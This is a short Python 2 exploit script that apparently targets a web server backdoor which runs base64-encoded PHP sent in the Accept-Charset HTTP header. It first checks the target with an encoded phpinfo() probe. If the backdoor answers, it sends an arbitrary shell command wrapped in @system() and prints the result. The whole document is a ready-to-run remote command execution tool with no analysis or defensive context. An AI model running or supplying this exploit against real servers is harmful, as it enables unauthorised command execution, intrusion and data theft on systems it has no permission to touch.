import requests
import base64
import sys

url = sys.argv[1]
cmd = "@system('" + sys.argv[2] + "');"
cmd = base64.b64encode(cmd)

headers_payload = {
            "Accept-Charset": cmd,
            "Accept-Encoding": "gzip,deflate"
        }
        
headers_poc = {
            "Accept-Charset": "cGhwaW5mbygpOw==",
            "Accept-Encoding": "gzip,deflate"
        }

res = requests.get(url, headers=headers_poc, verify=False)
if "phpinfo" in res.content:
    res = requests.get(url, headers=headers_payload, verify=False)
    print res.content
else:
    print "[-] Target no back door!"